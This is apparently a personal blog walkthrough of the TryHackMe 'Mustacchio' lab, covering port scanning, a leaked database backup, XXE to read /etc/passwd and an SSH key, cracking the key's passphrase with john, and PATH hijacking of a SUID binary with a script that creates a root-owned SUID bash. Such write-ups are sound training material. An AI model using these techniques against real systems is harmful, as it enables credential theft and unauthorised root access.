---
title: "Mustacchio TryHackMe Writeup"
last_modified_at: 2021-06-12T11:20:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - web
  - XXE
  - data exfiltration
  - ffuf
  - bruteforcing
  - tryhackme
  - easy
  - mustacchio
  - ssh2john
  - john the ripper
  - SUID
  - Path Hijacking
  - linux
  - Privilege Escaltion
  - XML Entity Injection
  - Nmap
  - writeup
  - walkthrough
---

<img alt="coconut" src="/assets/images/thm/mustacchio/mustacchio.png" width="200px" height="50px">

[Mustacchio](https://tryhackme.com/room/mustacchio) is an easy rated Linux room on Tryhackme by [zyeinn](https://tryhackme.com/p/zyeinn). A backup file is found on Port 80 which contains the login credentials for another webserver on Port 8765. The webserver is vulnerable to XXE through which a private key for local user is exfiltrated. On the box, a SUID binary is exploited to get root privileges. 
# Nmap
## Full Port Scan
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ sudo nmap -p- --min-rate 10000 -v -oN nmap/all-ports 10.10.151.230 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-12 09:04 +0545
Nmap scan report for 10.10.151.230
Host is up (0.20s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
           Raw packets sent: 131078 (5.767MB) | Rcvd: 3 (132B)
```

## Detail Scan
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ sudo nmap  -sC -sV -v 10.10.151.230
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-12 09:24 +0545
Nmap scan report for 10.10.151.230
Host is up (0.23s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d3:9e:50:66:5f:27:a0:60:a7:e8:8b:cb:a9:2a:f0:19 (RSA)
|   256 5f:98:f4:5d:dc:a1:ee:01:3e:91:65:0a:80:52:de:ef (ECDSA)
|_  256 5e:17:6e:cd:44:35:a8:0b:46:18:cb:00:8d:49:b3:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry  
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# HTTP Service on Port 80
![image](/assets/images/thm/mustacchio/Pasted image 20210612090707.png)
![image](/assets/images/thm/mustacchio/Pasted image 20210612090745.png)
One strange thing on the home page is the copyright date, which is from the future.

## Fuzzing with ffuf
![image](/assets/images/thm/mustacchio/Pasted image 20210612091137.png)
All the html pages contains static pages. /custom gives us a 301, so let us check that out.

## Checking /custom
![image](/assets/images/thm/mustacchio/Pasted image 20210612091245.png)

## Backup file inside /custom/js
![image](/assets/images/thm/mustacchio/Pasted image 20210612091327.png)

## Downloading the users.bak file
### Checking file format
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ file users.bak 
users.bak: SQLite 3.x database, last written using SQLite version 3034001
```
It is a sqlite database backup.

### Contents of the database
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ sqlite3 users.bak
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "users" (
        "id"    INTEGER,
        "username"      TEXT,
        "password"      TEXT,
        "role"  INTEGER
);
INSERT INTO users VALUES(1,'admin','1868e36a********************d4bc5f4b',NULL);
COMMIT;
```
We get a username and a hash.

## Trying to crack the hash
Before trying to crack the hash on my own box, I like to search online if any match for the hash can be found.
![image](/assets/images/thm/mustacchio/Pasted image 20210612091718.png)
And the hash is successfully cracked.
Even though we have login credentials we do not know where to login. Since SSH is open, let us try if those credentials work with SSH.

## Trying to login with SSH
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ ssh admin@10.10.151.230
The authenticity of host '10.10.151.230 (10.10.151.230)' can't be established.
ECDSA key fingerprint is SHA256:g//RSEsVCZF6FIydF0R24Gmek8fI6D7kRnDXF3fNK9Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.151.230' (ECDSA) to the list of known hosts.
admin@10.10.151.230: Permission denied (publickey).
```
Looks like password based authentication is disabled on the box.

## Full Port Scan
Since I had used `--min-rate 10000` flag, which sends 10000 packets per second while doing the full port scan, our nmap scan have missed other open ports on the box. So, let us do another full port scan with only 1000 packets per second.
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ sudo nmap -p- --min-rate 1000 10.10.151.230
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-12 09:25 +0545
Nmap scan report for 10.10.151.230
Host is up (0.24s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http
```
This time we get another open port.

## Visting HTTP Service on Port 8765
![image](/assets/images/thm/mustacchio/Pasted image 20210612093530.png)

If we try to  login with the earlier obtained credentials, we successfully log in.
![image](/assets/images/thm/mustacchio/Pasted image 20210612093649.png)

## Submiting the comment
![image](/assets/images/thm/mustacchio/Pasted image 20210612094121.png)
Interesting Things
- a url **/auth/dontforget.bak**
- User Barry which is a local user on the box
- POST Parameter is called **xml**

## Content of  the backup file
![image](/assets/images/thm/mustacchio/Pasted image 20210612094354.png)
Contains a xml. Let us try and submit the same xml on the **xml** parameter on `/home.php`.

## Checking if we can reflect xml on the page
![image](/assets/images/thm/mustacchio/Pasted image 20210612095823.png)

Our content is reflected on the respnse. Let us check if this webapp is vulnerable to XXE.

## XXE Check
![image](/assets/images/thm/mustacchio/Pasted image 20210612101009.png)
We are able to read the content of /etc/passwd. There are two users on the box except root which have a login shell.
- Barry (/home/barry)
- Joe (/home/joe)

Since the comment on the /home.php hints on the SSH key pair of user barry, let us check if the file is present.

## Trying to read barry private key from .ssh folder
![image](/assets/images/thm/mustacchio/Pasted image 20210612101120.png)

We can read barry's private SSH key but it looks like it is encrypted. 

We can use SSH2john to try and crack the password.

## Using ssh2john to convert into hash
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ /opt/john/john/run/ssh2john.py barry | tee hash
barry:$sshng$1$16$D137279D69A43E71BB7FCB87FC61D25E$1200$8ea0c93fe6e552bfb1325012601f6de20172325f55ba01d0240ca519913a27f6f59c6e7b78660e33cc1d66f54c1ab7cd6cd2556578fa565b9932bf6e117f18e2f0b66edd8a081885836db807ad73e17268896437e46fdb5ecd591b15e8348314319749ec31f5936dbaa9032d9b8abde8c64a110e5915ad37d92a21b5f0cfb288a6ffb74d6a910eba3466c3eaee044eb99767fdc1909f0da119bf1092c901432630579b4ee6a9f489ddde7d77086b1bd76eaeebb5fda95452f23f8ccf1b392d8359fc9fde79185d6c83e123c249329ccb853d616dba2c6eca3052dc59c1b40f797a9750f0c9e50166673c500b90147ec436c36cc15ca492bde0b3097604c4ea1b3d5bc3fd6039d0a3dc1c9cd4b27a9915977c3dc74a659c73ff1b1df76f552810ba5ec0f113a5cefae2eff58795c200d527dcac56948fcbdf5e2e777e2a7d8016cb7fab323a8d330c9e15bf0df270e89e4c7e9bea61857b146249a13fbb7af9e2f6732f4287817b5aa736f880397fc90268df0a83d457d8ec00b5d9e51cf4d742adcbc6f1770383ea014289039c65529c69a6be63f122c5534f7d36ef2933c1e8b759595a80c04238efde92861e3569576e1975a93b50eae0b59078f24c750a359541efc78349a9e4a0444bc9f71d6b8f64fdec476584e698a29c763350f8a364e1ca6f946f50a79161eee1420d6a2113fa842e944a678fe4e87880e054b5dc3e7d265bcb08a43a23039f2119ecb5807cefe6283243d61ef2a3992fef317f9e95c65cbe1e3b28d74d978910c7ae414939ab5122bc1a01a7a8826edbf1b57c193e4fe81671e4b9d56af1209ba29a68f0b850f74b65d96955c949d2bb8af0f713c29f5a380cc74cd716ee0c72709f0169226a162679a77a5a2587b4cf7c1bf850e8aeb23c33bb18387b059b8c829343fcb6d2fafa413d1cd7a2d0a55c7e90f7d23b2c8b9008de6109bf191c50f4e80f85d9a64da60d06ec5b324f04e7002b592d9eb519dc61362fb7b633950c64243d552ca6487d82abf9fa6759e8b544a90df5796db376d0947d4bb8592cebf809dd1cf6b696ab7dd0ffb01f68927786cc4acc6095a5cf5dd7152719b04ecf8a979e9f46898a0fd61d3ed0f852fcabe770a1ec28a224db05260e25636b3b5a2025c71f68be924b18cb69ce183c017245540b706910053f19f9e32d452135d7ead8af93adb20d18cfb177f3c1b30db2f18582f40a0d991a78af9b0635eb9aea83e0407d2b9e3446e3ba77b922c0a3674d5813b295a554279b31f2c88bbe922adc4b5699c5e9a6a4da226430843d2346ee90338b5cc380a046a694a253e60fb06420b969423a7191b432fd1729b497d834e6872505724414fdd719731f545e8205871ec37acaaba014d1e9f10196ab27ece3e54858f49401c70a022cc4f6b09a5bd29b76ecedb7687e19590635d874895980102a76ae6304953c1ad15c1b2a61f5c6f77fe0b79e499e0d9246449c315187944bd39fd5d5647d65211f6c7d6a959157ca4933f0720ddd243566bf73ffccac6334f832a41e801929f0e5dec0b481d441ee4510f99f3b9c5226c70f7977156fa195d9be83126fb3af7f6ec052151e794f1cb56b1e94a4663f0e7afb184e6c1a006d1227ee6c4dfcde4b968b1379f2679617488480d30ccb04c2300203eabaf3af9b44477e76b6a3824e91f5e2a048c13b81e543
```

## Cracking the hash using john
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ur******es       (barry)     
1g 0:00:00:01 DONE (2021-06-12 10:14) 0.6993g/s 2077Kp/s 2077Kc/s 2077KC/s urieljr.k..urielfabricio07
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Hash is successfully cracked.

## Trying to ssh into box as user barry
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ chmod 600 barry 
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ ssh barry@10.10.152.83 -i barry 
Enter passphrase for key 'barry': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 ...................[snip]...................

barry@mustacchio:~$ id
uid=1003(barry) gid=1003(barry) groups=1003(barry),4(adm)
```
And we login successfully. Just glancing at the groups, we are in the adm group which means we can read few sensitive log files(syslog, auth.log).

## Reading user.txt
```console
barry@mustacchio:~$ cat user.txt 
62d77***********51b831
```
# Privilege Escalalation
## Content on joe home directory
![image](/assets/images/thm/mustacchio/Pasted image 20210612101816.png)
A binary is found on joe's home directory which is owned by root and has setuid bit set on it. If we manage to find any misconfiguartion on this binary, we can probably get code execution as root since this binary runs with the effective privileges of root.

## Downloading the binary
```console
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ scp -i barry barry@10.10.152.83:/home/joe/live_log .
Enter passphrase for key 'barry': 
live_log                                                                                             100%   16KB  37.8KB/s   00:00    
reddevil@ubuntu:~/Documents/tryhackme/mustacchio$ 
```

## Reversing the binary in Ghidra
![image](/assets/images/thm/mustacchio/Pasted image 20210612102707.png)
The code is pretty simple. It just gets the content of the file **/var/log/nginx/access.log**

Since relative path is used for `tail` binary, we maybe able to create a `tail` binary on the home directory of user joe and get code execution.

## Checking if we have write Permission
```console
barry@mustacchio:/home/joe$ ls -la
total 28
drwxr-xr-x 2 joe  joe   4096 Apr 29 20:32 .
drwxr-xr-x 4 root root  4096 Apr 29 20:32 ..
-rwsr-xr-x 1 root root 16832 Apr 29 20:32 live_log
barry@mustacchio:/home/joe$ touch tail
touch: cannot touch 'tail': Permission denied
```
We do not have write permission.

## Checking logs
Since we are on adm group, let us check us log file if we can get anything interesting.
![image](/assets/images/thm/mustacchio/Pasted image 20210612103632.png)
Joe password is in plain text on the log files.

## Checking if the password works
```console
barry@mustacchio:/var/log$ su - joe
Password: 
su: Authentication failure
barry@mustacchio:/var/log$ su - joe
Password: 
: No such file or directory
```
If I try right password, it says `No such file or directory` and if I try the wrong password, it says `Authentication Failure`. This means we have write password but something is wrong with `su` binary.

Even though the password works, I can not find a way to get a shell as user joe.

## Path hijacking
Let us create a custom tail binary and try to hijack the path.

### Content of tail
```console
barry@mustacchio:/dev/shm$ cat tail 
#!/bin/bash
cp /bin/bash /tmp/bash
chmod 4777 /tmp/bash
```

### Modifying PATH variable
```console
barry@mustacchio:/dev/shm$ export PATH=`pwd`:$PATH
```

### Executing the live_log
```console
barry@mustacchio:/dev/shm$ /home/joe/live_log 
Live Nginx Log Reader
```
Logs are not shown which is a good sign.


## Checking if /tmp/bash exists
```console
barry@mustacchio:/dev/shm$ ls -la /tmp/bash
-rwsrwxrwx 1 root root 1037528 Jun 12 05:07 /tmp/bash
```
The binary exists and has SUID bit set on it and is owned by root.

## Getting a root shell
```console
barry@mustacchio:/dev/shm$ /tmp/bash -p
bash-4.3# id
uid=1003(barry) gid=1003(barry) euid=0(root) groups=1003(barry),4(adm)
```


# Reading root.txt
```console
bash-4.3# cat root.txt 
322358************9b530393a5
```

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>